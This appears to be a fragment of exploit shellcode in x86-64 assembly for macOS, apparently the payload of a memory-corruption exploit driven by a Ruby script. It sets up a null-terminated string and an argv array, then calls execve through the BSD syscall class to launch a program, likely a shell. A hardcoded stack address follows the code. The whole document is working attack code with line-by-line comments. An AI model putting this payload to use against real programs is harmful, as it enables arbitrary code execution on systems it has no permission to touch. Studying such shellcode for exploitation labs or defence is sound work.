attack:
    lea r10, [rip - 0x1f] # get base address of array (0x1f is length of string in ruby file + length of lea)
    xor rax, rax # zero out register for zero

    mov [r10 + 7], al # add null terminator for string
    mov [r10 + 8], r10 # place address of string @ argv[0]
    mov [r10 + 16], rax # place null terminator for argv @ argv[1]

    inc rax # pick UNIX/BSD class of system calls
    shl rax, 25 # 1 << 25 is 0x2000000, which is the section for BSD/UNIX system calls on macOS
    add rax, 0x3b # environment call 0x3b (execve)

    mov rdi, r10 # path
    lea rsi, [r10 + 8]
    xor edx, edx # null environment
    syscall
    
# 0x7ffeefbff110